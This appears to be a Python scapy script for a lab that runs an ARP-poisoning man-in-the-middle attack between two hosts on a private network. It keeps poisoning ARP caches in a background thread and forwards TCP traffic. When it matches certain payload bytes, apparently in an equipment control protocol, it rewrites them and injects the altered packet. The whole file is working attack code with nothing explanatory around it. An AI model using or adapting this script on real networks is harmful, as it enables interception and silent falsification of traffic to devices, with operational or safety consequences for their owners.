from scapy.all import *
from test01 import ArpPoison
from threading import Thread
from time import sleep

arpPoison = ArpPoison(mode=1)
        

def callback(pkt):
    if not hasattr(callback, "status"):
            callback.status = 0

    # previousPacket = pkt[TCP]
    # print(pkt[IP].src)
    # print(pkt[Ether].dst)
    if pkt[Ether].dst[13] != 'e':
        return
    if pkt[IP].src == "192.168.0.10" and pkt[IP].dst == "192.168.0.11":
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            if callback.status == 0 and pkt[IP].len == 0x36:
                print("catch!")
                if pkt[Raw].load[6] == 0x85 and pkt[Raw].load[7] == 0x03:
                    data = pkt[TCP].payload.load
                    newdata = data
                    send(newpkt/newdata)
                    callback.status = 1
                else:
                    data = pkt[TCP].payload.load
                    newdata = data

                    send(newpkt/newdata, verbose=0)
        
            elif callback.status == 1 and pkt[IP].len >= 0x2A:
                if pkt[Raw].load[4] == 0x80:
                    print("spoof!")
                    data = bytearray(pkt[Raw].load)
                    data[4] = 0x00
                    newdata = bytes(data)
                    send(newpkt/newdata)
                    callback.status = 0
                else:
                    data = pkt[TCP].payload.load
                    newdata = data

                    send(newpkt/newdata, verbose=0)
            
            else:
                data = pkt[TCP].payload.load
                newdata = data

                send(newpkt/newdata, verbose=0)

        else:
            send(newpkt, verbose=0)

    elif pkt[IP].src == "192.168.0.11" and pkt[IP].dst == "192.168.0.10":
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose = 0)
        

def threadPoison():
    while True:
        arpPoison.send()
        sleep(1)     

if __name__ == "__main__":
    MAC_EQUIPMENT = "00:0C:29:E9:42:B4"
    MAC_HOST = "00:0C:29:06:28:E5"
    thread = Thread(target=threadPoison, args=())
    thread.start()
    sniff(filter = "tcp", prn = callback, iface = "以太网 2")